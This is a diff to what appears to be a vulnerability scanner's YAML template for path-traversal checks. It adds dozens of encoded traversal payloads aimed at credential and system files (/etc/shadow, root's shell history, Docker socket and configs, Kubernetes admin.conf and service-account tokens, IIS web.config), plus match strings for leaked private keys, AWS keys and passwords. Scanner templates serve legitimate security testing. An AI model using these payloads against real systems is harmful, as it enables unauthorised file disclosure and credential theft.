@@ -67,6 +67,39 @@ wordLists:
     - .\\..\\/etc/passwd
     - .\\..\\.\\..\\/etc/passwd
     - ../../../../../../../../../../../../etc/passwd%00
+    - /var/lib/docker/containers/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+    - ..%252f..%252f..%252fvar%252flib%252fdocker%252fcontainers
+    - ..%5c..%5c..%5cC:%5cWindows%5cMicrosoft.NET%5cFramework%5cv4.0.30319%5cConfig%5cmachine.config
+    - ..//..//..//proc/self/environ
+    - ..%c0%afdocker.sock
+    - ../../../../../../../../../../../../etc/shadow%00
+    - ../../../../../../../../../../../../root/.bash_history%00
+    - ..//..//..//etc/kubernetes/admin.conf
+    - /var/lib/docker/containers
+    - /var/lib/docker/containers/*/config.v2.json
+    - /var/lib/docker/containers/*/hostconfig.json
+    - /root/.docker/config.json
+    - /var/run/docker.sock
+    - /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token
+    - /etc/kubernetes/admin.conf
+    - /root/.kube/config
+    - /proc/self/environ
+    - /proc/self/cmdline
+    - /sys/class/net/eth0/address
+    - /etc/resolv.conf
+    - /etc/hostname
+    - /var/log/docker.log
+    - /var/log/kube-apiserver.log
+    - C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config
+    - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+    - C:\inetpub\wwwroot\web.config
+    - C:\Program Files\dotnet\shared\Microsoft.NETCore.App\*\dotnet.exe
+    - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
+    - C:\Windows\System32\drivers\etc\hosts
+    - C:\Users\*\AppData\Local\Temp\*.dll
+    - C:\Windows\System32\inetsrv\config\applicationHost.config
+    - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\
+    - C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\ASP.NET\Temporary Internet Files\
 
 execute:
   type: single
@@ -99,7 +132,67 @@ execute:
 
 validate:
   response_payload:
-    regex: "root:.*:0:0:"
+    contains_either:
+      - "root:x:0:0:"     
+      - "daemon:x:"               
+      - "/bin/bash"              
+      - "/usr/sbin/nologin"      
+      - "root:$6$"               
+      - "PATH="                 
+      - "LANG="                  
+      - "SHELL="                
+      - "docker_version"          
+      - "apiVersion: v1"          
+      - "kind: Pod"              
+      - "kubernetes-admin@"       
+      - "client-certificate-data" 
+      - "docker.sock"             
+      - "Entrypoint"             
+      - "shosts.equiv"           
+      - "AuthorizedKeysFile"     
+      - "/var/log/auth.log"     
+      - "/etc/hostname"          
+      - "127.0.0.1"
+      - "<configuration>"         
+      - "<connectionStrings>"     
+      - "Data Source="            
+      - "Trusted_Connection="    
+      - "<appSettings>"           
+      - "<system.web>"           
+      - "localhost:8080"          
+      - "IIS://localhost/"       
+      - "machine.config"         
+      - "<authorization>"        
+      - "<authentication mode="   
+      - "RequestFiltering"        
+      - "AllowUnlisted="         
+      - "<identity impersonate=" 
+      - "ASP.NET_SessionId"       
+      - "-----BEGIN RSA PRIVATE KEY-----"
+      - "-----BEGIN OPENSSH PRIVATE KEY-----"
+      - "-----BEGIN CERTIFICATE-----"
+      - "aws_secret_access_key="
+      - "aws_access_key_id="
+      - "access_key_id:"
+      - "client_secret:"
+      - "session_id="
+      - "Bearer "                
+      - "Authorization: Basic"  
+      - "root_password"          
+      - "db_password"           
+      - "id_rsa"                 
+      - "PRIVATE KEY"           
+      - "BEGIN PGP PRIVATE KEY" 
+      - "127.0.0.1:5000" 
+      - "Listen 80" 
+      - "DocumentRoot"        
+      - "ServerName"             
+      - "worker_processes"      
+      - "server_name"          
+      - "/etc/nginx/nginx.conf"   
+      - "error_log"               
+      - "/var/lib/etcd"          
+      - "admin_password"         
     length:
       gt: 0
     not_contains:
